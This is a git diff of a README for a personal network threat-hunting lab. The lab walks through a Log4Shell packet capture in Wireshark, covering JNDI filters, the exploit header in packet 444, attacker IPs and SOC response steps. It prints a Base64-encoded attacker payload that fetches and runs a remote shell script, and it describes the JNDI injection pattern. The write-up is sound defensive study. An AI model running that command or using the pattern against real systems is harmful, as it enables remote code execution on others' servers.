@@ -6,7 +6,7 @@ In this lab, I documented the investigation of a malicious packet capture (PCAP)
 
 ##  Objective
 
-- Analyze a suspicious `.pcapng` file  (Optional-Download : https://bit.ly/Log4jAttack)
+- Analyze a suspicious `.pcapng` file 
 - Detect Log4j exploit attempts via JNDI injection  
 - Decode any hidden payloads  
 - Confirm if any callback/C2 behavior occurred  
@@ -35,22 +35,21 @@ In this lab, I documented the investigation of a malicious packet capture (PCAP)
 
 ### Step 1 : Initial Packet Capture Review
 
-- Loaded the `.pcapng` file into **Wireshark**
+- Loaded the `.pcapng` file into **Wireshark** (Optional-Download : https://bit.ly/Log4jAttack)
 - Since this was an offline PCAP, interface selection was irrelevant
 
 
 
 
-
-This shows suspicious traffic where JNDI strings are present in HTTP request payloads—an indicator of potential Log4j exploitation attempts.
-
-![Initial inspection: frame contains "jndi"](Screnshotslog4j/framecontainsjndi.png)
-
 ---
 
 ### Step 2: Applied Filter to Detect Log4j Exploits
 
-**Filter Used:** ip contains "jndi"
+**Filter Used:** frame contains "jndi"
+
+![Initial inspection: frame contains "jndi"](Screnshotslog4j/framecontainsjndi.png)
+
+This shows suspicious traffic where JNDI strings are present in HTTP request payloads—an indicator of potential Log4j exploitation attempts.
 
 
 **Goal:** Detect `${jndi:...}` pattern commonly used in Log4Shell attacks
@@ -65,21 +64,82 @@ This shows suspicious traffic where JNDI strings are present in HTTP request pay
 
 ### Step 3: Isolate Callback Behavior
 
-This screenshot captures both the use of the composite filter and a specific request containing a Base64-encoded command in the `User-Agent` header.
 
 ![Callback filter applied in Wireshark](Screnshotslog4j/checkC2.png)
 
+With this filter on the screenshot I am simply asking:
 
-**Goal:** Identify callback attempts to attacker-controlled servers (C2).
+“Can I see both the exploit being delivered, and then the server reaching out, possibly due to running the attacker's code?”
+
+## In Real production environment ##
+
+I am testing for:
+
+ - Both the attack and signs that the server tried to call back (C2 attempt).
+
+- This could expose the initial stage (injection) + follow-up behavior (outbound connections).
+
+ I believe this is exactly what threat analysts do when hunting:
+
+- Ingress: Who sent the attack?
+
+- Egress: Did the server connect back (C2)? Did the shell script run?
+
 
 ---
 
-### Step 4: Decode the Payload with CyberChef
+###  Step 4: Decode the Payload with CyberChef
 
-**Base64 Payload Extracted:**
+What I Found: Deep Dive into Packet No. 444
 
-d2dldCBodHRwOi8vNjIuMjEwLjEzMC4yNTAvbGguc2g7Y2htb2QgK3ggbGguc2g7Li9saC5zaA==
+While going through the PCAP file in Wireshark, I selected **Packet No. 444** and found the following:
 
+
+
+This screenshot captures the exact request and malicious header used by the attacker to exploit Log4j.
+
+![Log4j exploit payload in User-Agent header](Screnshotslog4j/Log4j_exploit.png)
+
+---
+
+### After analyzing what is happening:
+
+- The attacker (`45.137.21.9`) is trying to exploit a vulnerable Log4j server at `198.71.247.91`.
+- They embedded a malicious string in the `User-Agent` header.
+- The `${jndi:ldap://...}` part is a **Log4j exploit payload**.
+- The segment after `/Base64/...` is likely **Base64-encoded shell commands**, possibly a reverse shell or downloader script.
+
+---
+
+### This Is Classic Log4Shell Behavior
+
+| Component             | Meaning                                                                 |
+|------------------------|-------------------------------------------------------------------------|
+| `${jndi:...}`          | Triggers Log4j to fetch and execute remote code                        |
+| `ldap://...`           | Points to the attacker's LDAP server delivering malicious script |
+| `Base64/...`           | Encodes the actual payload to evade detection and obfuscate intent     |
+
+---
+
+### What I Would Do as a SOC Analyst in a Real Production Environment:
+
+1. **Tag This IP as Malicious**
+   - Add `45.137.21.9` to a watchlist or threat intel feed.
+   - Check internal logs for any responses to this IP.
+
+2. **Decode the Base64 Payload**
+   - Extract the string after `/Base64/` : d2dldCBodHRwOi8vNjIuMjEwLjEzMC4yNTAvbGguc2g7Y2htb2QgK3ggbGguc2g7Li9saC5zaA==
+   - Use **CyberChef** or similar tools to decode and inspect it.
+
+3. **Correlate With Server Behavior**
+   - Check if the target server (`198.71.247.91`) attempted **LDAP or HTTP callbacks**.
+   - Investigate firewall logs, DNS resolutions, and endpoint telemetry.
+
+4. **Report or Block**
+   - Share IOCs (e.g., IP address, `User-Agent` JNDI pattern) with internal security teams.
+   - Update detection rules to catch similar header-based attacks in future traffic.
+
+---
 
 
 **Decoded with CyberChef:**  
@@ -111,7 +171,7 @@ This screenshot shows that multiple security vendors (e.g., BitDefender, ESET, D
 
 ---
 
-## 🔎 Additional Observations
+## Additional Observations
 
 - Attacker LDAP server `45.137.21.9:1389` delivered the malicious redirect
 - Script `lh.sh` likely contains second-stage malware or C2 payload
@@ -128,7 +188,7 @@ This screenshot shows that multiple security vendors (e.g., BitDefender, ESET, D
 
 ---
 
-## 🚨 Indicators of Compromise (IOCs)
+## Indicators of Compromise (IOCs)
 
 | Type               | Value                          |
 |--------------------|--------------------------------|
@@ -140,7 +200,7 @@ This screenshot shows that multiple security vendors (e.g., BitDefender, ESET, D
 
 ---
 
-## 💡 Summary of Insights
+## Summary of Insights
 
 - Real-world **Log4j RCE** attempt detected
 - Payload was **Base64 encoded** to obscure intent
@@ -149,7 +209,7 @@ This screenshot shows that multiple security vendors (e.g., BitDefender, ESET, D
   
 ---
 
-## 📚 Lessons Learned
+## Lessons Learned
 
 - Log4j exploits can hide in HTTP headers like `User-Agent`
 - Always decode suspicious strings to understand payload behavior
@@ -159,7 +219,7 @@ This screenshot shows that multiple security vendors (e.g., BitDefender, ESET, D
 
 ---
 
-## ✅ Conclusion
+##  Conclusion
 
 This concludes **Case Study #1** in the Network Threat Hunting Lab.  
 It demonstrates a full-stack analysis pipeline suitable for my:
@@ -172,7 +232,7 @@ It demonstrates a full-stack analysis pipeline suitable for my:
 
 * This personal lab project demonstrates my understanding of network protocols, threat patterns, and detection techniques used in real SOC environments.
    
-🧠 Credit: Thanks to Brad Duncan for providing this sample file for educational use.
+Credit: Thanks to Brad Duncan for providing this sample file for educational use.
 
 * ⚠️ **Disclaimer**: This project is for educational and demonstration purposes only. The linked PCAP file is publicly shared by its original author (Brad Duncan) and does not contain real user data. Always analyze malicious traffic responsibly in a safe, isolated environment.
 
